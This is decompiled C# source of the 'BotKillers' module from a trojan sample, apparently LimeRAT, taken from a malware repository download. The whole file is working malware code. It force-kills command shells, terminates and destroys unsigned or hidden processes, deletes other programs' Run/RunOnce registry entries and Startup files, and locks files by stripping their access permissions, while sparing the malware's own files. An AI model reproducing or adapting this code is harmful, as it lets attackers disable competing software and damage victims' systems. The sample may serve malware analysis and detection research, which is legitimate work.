// Decompiled with JetBrains decompiler
// Type: BotKillers
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Lime;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class BotKillers
{
  private static int ProccessKilled = 0;
  private static int Startupkilled = 0;
  private static string hio;

  [DllImport("user32.dll", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool IsWindowVisible(IntPtr hWnd);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

  public static void RunStandardBotKiller()
  {
    int num1;
    int num2;
    try
    {
label_2:
      ProjectData.ClearProjectError();
      num1 = -2;
label_3:
      int num3 = 2;
      Interaction.Shell("TASKKILL /F /IM wscript.exe", AppWinStyle.Hide);
label_4:
      num3 = 3;
      Interaction.Shell("TASKKILL /F /IM cmd.exe", AppWinStyle.Hide);
label_5:
      num3 = 4;
      BotKillers.ScanProcess();
label_6:
      num3 = 5;
      BotKillers.RunStartupKiller();
label_7:
      num3 = 6;
      BotKillers.ProccessKilled = 0;
label_8:
      num3 = 7;
      BotKillers.Startupkilled = 0;
      goto label_15;
label_10:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_2;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 4:
              goto label_5;
            case 5:
              goto label_6;
            case 6:
              goto label_7;
            case 7:
              goto label_8;
            case 8:
              goto label_15;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_10;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_15:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static void ScanProcess()
  {
    try
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        Process process = processes[index];
        try
        {
          string fullPath = Path.GetFullPath(process.MainModule.FileName);
          if (BotKillers.IsFileMalicious(fullPath))
          {
            if (!BotKillers.WindowIsVisible(process.MainWindowTitle))
            {
              BotKillers.TerminateProcess(process.Id);
              BotKillers.DestroyFile(fullPath);
              checked { ++BotKillers.ProccessKilled; }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static bool IsFileMalicious(string fileloc)
  {
    int num1;
    bool flag;
    int num2;
    try
    {
label_2:
      ProjectData.ClearProjectError();
      num1 = -2;
label_3:
      int num3 = 2;
      Path.GetFileNameWithoutExtension(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Core.RG);
label_4:
      num3 = 3;
      if (!fileloc.Contains(Application.ExecutablePath))
        goto label_6;
label_5:
      num3 = 4;
      flag = false;
      goto label_54;
label_6:
label_7:
      num3 = 6;
      if (!fileloc.Contains(Core.RG))
        goto label_9;
label_8:
      num3 = 7;
      flag = false;
      goto label_54;
label_9:
label_10:
      num3 = 9;
      if (!fileloc.Contains("Ransomware"))
        goto label_12;
label_11:
      num3 = 10;
      flag = false;
      goto label_54;
label_12:
label_13:
      num3 = 12;
      if (!fileloc.EndsWith(".Lime"))
        goto label_15;
label_14:
      num3 = 13;
      flag = false;
      goto label_54;
label_15:
label_16:
      num3 = 15;
      if (!fileloc.ToLower().Contains("malware"))
        goto label_19;
label_17:
      num3 = 16;
      BotKillers.DestroyFile(fileloc);
label_18:
label_19:
label_20:
      num3 = 18;
      if (!fileloc.Contains("Google.com"))
        goto label_22;
label_21:
      num3 = 19;
      flag = false;
      goto label_54;
label_22:
label_23:
      num3 = 21;
      if (!fileloc.Contains("Microsoft.com"))
        goto label_25;
label_24:
      num3 = 22;
      flag = false;
      goto label_54;
label_25:
label_26:
      num3 = 24;
      if (!fileloc.Contains("cmd"))
        goto label_28;
label_27:
      num3 = 25;
      flag = true;
      goto label_54;
label_28:
label_29:
      num3 = 27;
      if (!fileloc.Contains("wscript"))
        goto label_31;
label_30:
      num3 = 28;
      flag = true;
      goto label_54;
label_31:
label_32:
      num3 = 30;
      if (!fileloc.Contains(RuntimeEnvironment.GetRuntimeDirectory()))
        goto label_34;
label_33:
      num3 = 31;
      flag = true;
      goto label_54;
label_34:
label_35:
      num3 = 33;
      if (!BotKillers.WinTrust.VerifyEmbeddedSignature(fileloc))
        goto label_37;
label_36:
      num3 = 34;
      flag = false;
      goto label_54;
label_37:
label_38:
      num3 = 36;
      if (!(fileloc.Contains(Environment.GetEnvironmentVariable("USERPROFILE")) | fileloc.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))))
        goto label_40;
label_39:
      num3 = 37;
      flag = true;
      goto label_54;
label_40:
label_41:
      num3 = 39;
      FileAttributes attributes = File.GetAttributes(fileloc);
label_42:
      num3 = 40;
      if ((attributes & FileAttributes.System) != FileAttributes.System)
        goto label_44;
label_43:
      num3 = 41;
      flag = true;
      goto label_54;
label_44:
label_45:
      num3 = 43;
      if ((attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
        goto label_47;
label_46:
      num3 = 44;
      flag = true;
      goto label_54;
label_47:
label_48:
      num3 = 46;
      flag = false;
      goto label_54;
label_50:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_2;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 4:
              goto label_5;
            case 5:
              goto label_6;
            case 6:
              goto label_7;
            case 7:
              goto label_8;
            case 8:
              goto label_9;
            case 9:
              goto label_10;
            case 10:
              goto label_11;
            case 11:
              goto label_12;
            case 12:
              goto label_13;
            case 13:
              goto label_14;
            case 14:
              goto label_15;
            case 15:
              goto label_16;
            case 16:
              goto label_17;
            case 17:
              goto label_18;
            case 18:
              goto label_20;
            case 19:
              goto label_21;
            case 20:
              goto label_22;
            case 21:
              goto label_23;
            case 22:
              goto label_24;
            case 23:
              goto label_25;
            case 24:
              goto label_26;
            case 25:
              goto label_27;
            case 26:
              goto label_28;
            case 27:
              goto label_29;
            case 28:
              goto label_30;
            case 29:
              goto label_31;
            case 30:
              goto label_32;
            case 31:
              goto label_33;
            case 32:
              goto label_34;
            case 33:
              goto label_35;
            case 34:
              goto label_36;
            case 35:
              goto label_37;
            case 36:
              goto label_38;
            case 37:
              goto label_39;
            case 38:
              goto label_40;
            case 39:
              goto label_41;
            case 40:
              goto label_42;
            case 41:
              goto label_43;
            case 42:
              goto label_44;
            case 43:
              goto label_45;
            case 44:
              goto label_46;
            case 45:
              goto label_47;
            case 46:
              goto label_48;
            case 47:
              goto label_54;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_50;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_54:
    if (num2 != 0)
      ProjectData.ClearProjectError();
    return flag;
  }

  public static void KillFile(string location)
  {
    try
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(location);
      DirectorySecurity directorySecurity = new DirectorySecurity();
      directorySecurity.SetAccessRuleProtection(true, false);
      directoryInfo.SetAccessControl(directorySecurity);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static bool WindowIsVisible(string WinTitle)
  {
    bool flag;
    try
    {
      flag = BotKillers.IsWindowVisible(BotKillers.FindWindow((string) null, WinTitle));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static void RunStartupKiller()
  {
    int num1;
    int num2;
    try
    {
label_2:
      ProjectData.ClearProjectError();
      num1 = -2;
label_3:
      int num3 = 2;
      BotKillers.StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 1);
label_4:
      num3 = 3;
      BotKillers.StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 1);
label_5:
      num3 = 4;
      if (!BotKillers.IsAdmin())
        goto label_9;
label_6:
      num3 = 5;
      BotKillers.StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 2);
label_7:
      num3 = 6;
      BotKillers.StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 2);
label_8:
label_9:
label_10:
      num3 = 8;
      Path.GetFileNameWithoutExtension(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Core.RG);
label_11:
      num3 = 9;
      IEnumerator<string> enumerator = MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.Programs + "\\Startup").GetEnumerator();
      goto label_22;
label_13:
      num3 = 10;
      string current;
      if (!(!current.Contains(Application.ExecutablePath) & !current.Contains(Core.RG) & !current.EndsWith(".Lime") & !current.EndsWith(".txt") & !current.EndsWith(".ini")))
        goto label_20;
label_14:
      num3 = 11;
      BotKillers.DestroyFile(current);
label_15:
      num3 = 12;
      Thread.Sleep(50);
label_16:
      num3 = 13;
      BotKillers.DestroyFile(current);
label_17:
      num3 = 14;
      Thread.Sleep(50);
label_18:
      num3 = 15;
      BotKillers.DestroyFile(current);
label_19:
label_20:
label_21:
      num3 = 17;
label_22:
      if (enumerator.MoveNext())
      {
        current = enumerator.Current;
        goto label_13;
      }
label_23:
      num3 = 18;
      if (enumerator != null)
      {
        enumerator.Dispose();
        goto label_31;
      }
      else
        goto label_31;
label_26:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_2;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 4:
              goto label_5;
            case 5:
              goto label_6;
            case 6:
              goto label_7;
            case 7:
              goto label_8;
            case 8:
              goto label_10;
            case 9:
              goto label_11;
            case 10:
              goto label_13;
            case 11:
              goto label_14;
            case 12:
              goto label_15;
            case 13:
              goto label_16;
            case 14:
              goto label_17;
            case 15:
              goto label_18;
            case 16:
              goto label_19;
            case 17:
              goto label_21;
            case 18:
              goto label_23;
            case 19:
              goto label_31;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_26;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_31:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static void StartupFucker(string regkey, int type)
  {
    try
    {
      RegistryKey registryKey;
      if (type == 1)
        registryKey = Registry.CurrentUser.OpenSubKey(regkey);
      if (type == 2)
        registryKey = Registry.LocalMachine.OpenSubKey(regkey);
      string[] valueNames = registryKey.GetValueNames();
      int index = 0;
      while (index < valueNames.Length)
      {
        string str1 = valueNames[index];
        try
        {
          string str2 = registryKey.GetValue(str1).ToString();
          if (str2.Contains("-"))
          {
            if (str2.Contains("\""))
              str2.Replace("\"", string.Empty);
            try
            {
              str2 = Strings.Split(str2, " -")[0];
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          if (str2.Contains("\""))
            str2 = Conversions.ToString(((object[]) str2.Split('"'))[1]);
          if (!str2.Contains(Core.RG) & !str2.Contains(Application.ExecutablePath))
          {
            BotKillers.RemoveKey(type, str1, regkey, str2);
            if (!BotKillers.WinTrust.VerifyEmbeddedSignature(str2))
            {
              BotKillers.TerminateProcessPath(str2);
              BotKillers.DestroyFile(str2);
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void RemoveKey(int Reg, string file, string reglocation, string FileLocation)
  {
    try
    {
      string name = reglocation;
      RegistryKey registryKey = Reg != 1 ? Registry.LocalMachine.OpenSubKey(name, true) : Registry.CurrentUser.OpenSubKey(name, true);
      using (registryKey)
        registryKey?.DeleteValue(file);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void DestroyFile(string path)
  {
    try
    {
      if (!File.Exists(path))
        return;
      Random random = new Random();
      try
      {
        BotKillers.AllowAccess(path);
        MyProject.Computer.FileSystem.MoveFile(path, Path.GetTempPath() + Conversions.ToString(random.Next(10000, 90000)));
        File.WriteAllText(path, string.Empty);
        FileSystem.FileOpen(FileSystem.FreeFile(), path, OpenMode.Input, Share: OpenShare.LockReadWrite);
        BotKillers.KillFile(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        DirectoryInfo directoryInfo = new DirectoryInfo(path);
        DirectorySecurity directorySecurity = new DirectorySecurity();
        directorySecurity.SetAccessRuleProtection(true, false);
        directoryInfo.SetAccessControl(directorySecurity);
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static bool IsAdmin()
  {
    bool flag;
    try
    {
      flag = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static void AllowAccess(string location)
  {
    try
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(location);
      DirectorySecurity directorySecurity = new DirectorySecurity();
      directorySecurity.SetAccessRuleProtection(false, true);
      directoryInfo.SetAccessControl(directorySecurity);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void TerminateProcessPath(string Path)
  {
    try
    {
      if (Path.Contains(Process.GetCurrentProcess().ProcessName.ToString()))
        return;
      if (Path.Contains("\\"))
      {
        string[] strArray = Strings.Split(Path, "\\");
        int index = 0;
        while (index < strArray.Length)
        {
          string str = strArray[index];
          if (str.Contains(".exe"))
            Path = str;
          checked { ++index; }
        }
      }
      if (Path.Contains(".exe"))
        Path = Path.Replace(".exe", string.Empty);
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index1 = 0;
      while (index1 <= num)
      {
        Process process = processes[index1];
        if (process.ProcessName.Contains(Path))
          BotKillers.TerminateProcess(process.Id);
        checked { ++index1; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void TerminateProcess(int PID)
  {
    try
    {
      Process processById = Process.GetProcessById(PID);
      if (Operators.CompareString(processById.ProcessName, string.Empty, false) == 0)
        return;
      try
      {
        foreach (ProcessThread thread in (ReadOnlyCollectionBase) processById.Threads)
        {
          IntPtr num = BotKillers.OpenThread(BotKillers.ThreadAccess.SUSPEND_RESUME | BotKillers.ThreadAccess.TERMINATE, true, checked ((uint) thread.Id));
          if (num != IntPtr.Zero)
          {
            BotKillers.SuspendThread(num);
            BotKillers.TerminateThread(num, 1U);
            BotKillers.CloseHandle(num);
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern bool CloseHandle(IntPtr hHandle);

  [DllImport("kernel32.dll")]
  private static extern IntPtr OpenThread(
    BotKillers.ThreadAccess dwDesiredAccess,
    bool bInheritHandle,
    uint dwThreadId);

  [DllImport("kernel32.dll", SetLastError = true)]
  public static extern int SuspendThread(IntPtr hThread);

  [DllImport("kernel32.dll")]
  private static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

  public enum ThreadAccess
  {
    TERMINATE = 1,
    SUSPEND_RESUME = 2,
    GET_CONTEXT = 8,
    SET_CONTEXT = 16, // 0x00000010
    SET_INFORMATION = 32, // 0x00000020
    QUERY_INFORMATION = 64, // 0x00000040
    SET_THREAD_TOKEN = 128, // 0x00000080
    IMPERSONATE = 256, // 0x00000100
    DIRECT_IMPERSONATION = 512, // 0x00000200
  }

  public enum WinTrustDataUIChoice : uint
  {
    All = 1,
    None = 2,
    NoBad = 3,
    NoGood = 4,
  }

  public enum WinTrustDataRevocationChecks : uint
  {
    None,
    WholeChain,
  }

  public enum WinTrustDataChoice : uint
  {
    File = 1,
    Catalog = 2,
    Blob = 3,
    Signer = 4,
    Certificate = 5,
  }

  public enum WinTrustDataStateAction : uint
  {
    Ignore,
    Verify,
    Close,
    AutoCache,
    AutoCacheFlush,
  }

  [System.Flags]
  public enum WinTrustDataProvFlags : uint
  {
    UseIe4TrustFlag = 1,
    NoIe4ChainFlag = 2,
    NoPolicyUsageFlag = 4,
    RevocationCheckNone = 16, // 0x00000010
    RevocationCheckEndCert = 32, // 0x00000020
    RevocationCheckChain = 64, // 0x00000040
    RevocationCheckChainExcludeRoot = 128, // 0x00000080
    SaferFlag = 256, // 0x00000100
    HashOnlyFlag = 512, // 0x00000200
    UseDefaultOsverCheck = 1024, // 0x00000400
    LifetimeSigningFlag = 2048, // 0x00000800
    CacheOnlyUrlRetrieval = 4096, // 0x00001000
  }

  public enum WinTrustDataUIContext : uint
  {
    Execute,
    Install,
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public class WinTrustFileInfo
  {
    private int StructSize;
    private IntPtr pszFilePath;
    private IntPtr hFile;
    private IntPtr pgKnownSubject;

    public WinTrustFileInfo(string _filePath)
    {
      this.StructSize = Marshal.SizeOf(typeof (BotKillers.WinTrustFileInfo));
      this.hFile = IntPtr.Zero;
      this.pgKnownSubject = IntPtr.Zero;
      this.pszFilePath = Marshal.StringToCoTaskMemAuto(_filePath);
    }

    ~WinTrustFileInfo() => Marshal.FreeCoTaskMem(this.pszFilePath);
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public class WinTrustData
  {
    private int StructSize;
    private IntPtr PolicyCallbackData;
    private IntPtr SIPClientData;
    private BotKillers.WinTrustDataUIChoice UIChoice;
    private BotKillers.WinTrustDataRevocationChecks RevocationChecks;
    private BotKillers.WinTrustDataChoice UnionChoice;
    private IntPtr FileInfoPtr;
    private BotKillers.WinTrustDataStateAction StateAction;
    private IntPtr StateData;
    private string URLReference;
    private BotKillers.WinTrustDataProvFlags ProvFlags;
    private BotKillers.WinTrustDataUIContext UIContext;

    public WinTrustData(string _fileName)
    {
      this.StructSize = Marshal.SizeOf(typeof (BotKillers.WinTrustData));
      this.PolicyCallbackData = IntPtr.Zero;
      this.SIPClientData = IntPtr.Zero;
      this.UIChoice = BotKillers.WinTrustDataUIChoice.None;
      this.RevocationChecks = BotKillers.WinTrustDataRevocationChecks.None;
      this.UnionChoice = BotKillers.WinTrustDataChoice.File;
      this.StateAction = BotKillers.WinTrustDataStateAction.Ignore;
      this.StateData = IntPtr.Zero;
      this.URLReference = (string) null;
      this.ProvFlags = BotKillers.WinTrustDataProvFlags.SaferFlag;
      this.UIContext = BotKillers.WinTrustDataUIContext.Execute;
      BotKillers.WinTrustFileInfo structure = new BotKillers.WinTrustFileInfo(_fileName);
      this.FileInfoPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof (BotKillers.WinTrustFileInfo)));
      Marshal.StructureToPtr((object) structure, this.FileInfoPtr, false);
    }

    ~WinTrustData() => Marshal.FreeCoTaskMem(this.FileInfoPtr);
  }

  public enum WinVerifyTrustResult
  {
    ProviderUnknown = -2146762751, // 0x800B0001
    ActionUnknown = -2146762750, // 0x800B0002
    SubjectFormUnknown = -2146762749, // 0x800B0003
    SubjectNotTrusted = -2146762748, // 0x800B0004
    Success = 0,
  }

  public sealed class WinTrust
  {
    private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
    private const string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";

    [DllImport("wintrust.dll", CharSet = CharSet.Unicode)]
    private static extern BotKillers.WinVerifyTrustResult WinVerifyTrust(
      [In] IntPtr hwnd,
      [MarshalAs(UnmanagedType.LPStruct), In] Guid pgActionID,
      [In] BotKillers.WinTrustData pWVTData);

    public static bool VerifyEmbeddedSignature(string fileName)
    {
      bool flag;
      try
      {
        BotKillers.WinTrustData pWVTData = new BotKillers.WinTrustData(fileName);
        Guid pgActionID = new Guid("{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}");
        flag = BotKillers.WinTrust.WinVerifyTrust(BotKillers.WinTrust.INVALID_HANDLE_VALUE, pgActionID, pWVTData) == BotKillers.WinVerifyTrustResult.Success;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    private WinTrust()
    {
    }
  }
}
